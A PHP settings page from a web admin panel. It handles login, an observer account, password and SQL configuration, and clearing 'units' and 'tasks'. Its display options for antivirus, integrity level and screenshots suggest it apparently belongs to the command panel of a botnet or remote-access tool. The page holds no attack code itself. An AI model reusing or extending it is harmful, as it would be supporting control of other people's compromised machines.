<?php

   session_start();

   include("Functions.php");
   include("Header.php");
   include("Cfg/Lang.php"); 
   include("Cfg/Config.php");

   if (!(isset($_SESSION['Name'])))
   {
      header("Location: Login.php");
      exit;
   }

   if ($_SESSION['Name'] == $conf["observer_login"])  
   {
      echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 0px solid;\">
         <tr style=background-color:#11101d; height=\"50\">
            <td>
               <div align = center>
                  <font color=\"#E4E9F7\">" . $_SESSION['Name'] . $lang["_011"] . "</font>
               </div>
            </td>
         </tr>
         <tr>
            <td>
               <img src=\"Images\Ang.png\" align=\"top\"></img>
            </td>
         </tr>
      </table>";

      echo "<table border=\"0\" width=\"100%\" height=\"300\">
               <tr>
                  <td>
                     <div align = center>" . $lang["00881"] . "</div>
                  </td>
               </tr>
            </table>";

      exit(0);
   }

   if(isset($_POST["submit"])) 
   {        
      SaveConfig($_POST["newlogin"], $_POST["newpass"], $_POST["oldpass"], $_POST["obslogin"], $_POST["obspass"]);
      die;
   }

   if(isset($_POST["sql"])) 
   {        
      SaveSQL($_POST["sqlhost"], $_POST["sqlname"], $_POST["sqluser"], $_POST["sqlpass"], $_POST["oldpass"]); 
      die;
   }

   if(isset($_POST["clear"])) 
   {  
      DeleteUnits();     
      die;
   }

   if(isset($_POST["cleartasks"])) 
   {  
      DeleteTasks();    
      die;
   }

   if(isset($_POST["createtable"])) 
   {  
      CreateTable();    
      die;
   }

   if(isset($_POST["options"])) 
   {  

      if ($_POST['op_showdomain'] == "")
      {
         $d = "0";
      }
      else
      {
         $d = "1";
      }      

      if ($_POST['op_showhost'] == "")
      {
         $h = "0";
      }
      else
      {
         $h = "1";
      }

      if ($_POST['op_showuser'] == "")
      {
         $u = "0";
      }
      else
      {
         $u = "1";
      }

      if ($_POST['op_showav'] == "")
      {
         $a = "0";
      }
      else
      {
         $a = "1";
      }

      if ($_POST['op_showil'] == "")
      {
         $l = "0";
      }
      else
      {
         $l = "1";
      }

      if ($_POST['op_showreg'] == "")
      {
         $r = "0";
      }
      else
      {
         $r = "1";
      }

      if ($_POST['op_showscreen'] == "")
      {
         $s = "0";
      }
      else
      {
         $s = "1";
      }
      
      $y = $_POST['op_lang'];

      SaveOptions($h, $u, $a, $d, $l, $r, $y, $s);
      die;
   }

   echo "<table cellpadding=0 cellspacing=0 width=\"100%\" style =\"border: 0px solid;\">
         <tr style=background-color:#11101d; height=\"50\">
            <td>
               <div align = center>
                  <font color=\"#E4E9F7\">" . $_SESSION['Name'] . $lang["_011"] . "</font>
               </div>
            </td>
         </tr>
         <tr>
            <td>
               <img src=\"Images\Ang.png\" align=\"top\"></img>
            </td>
         </tr>
         </table>";

   echo MakeFormOptions();  
   sTable();
   echo MakeFormChangePass();
   sTable();
   echo MakeFormSQLsettings();
   sTable();
   echo MakeFormCleaningDB(); 
   sTable();
   echo MakeFormCleaningTask();
   sTable();
   echo MakeFormCreateTable();
   sTable();

   include("Footer.php");
?>